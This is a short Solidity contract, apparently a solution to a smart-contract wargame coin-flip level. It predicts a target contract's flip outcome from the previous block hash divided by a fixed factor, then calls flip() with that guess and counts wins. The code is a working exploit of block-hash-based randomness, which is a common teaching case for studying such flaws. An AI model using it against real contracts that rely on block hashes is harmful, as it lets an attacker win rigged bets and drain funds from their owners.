// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * Author: 0xdeephunt@gmail.com
 * Copyright Copyright (c) 2025 0xdeephunt@gmail.com
 * license MIT License
 */

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipAttack {
    uint256 public winNumber = 0;

    function attack(address _contractAddress) public returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip coinFlipContract = ICoinFlip(_contractAddress);

        bool result = coinFlipContract.flip(side);
        if (result) {
            winNumber++;
        }

        return result;
    }
}
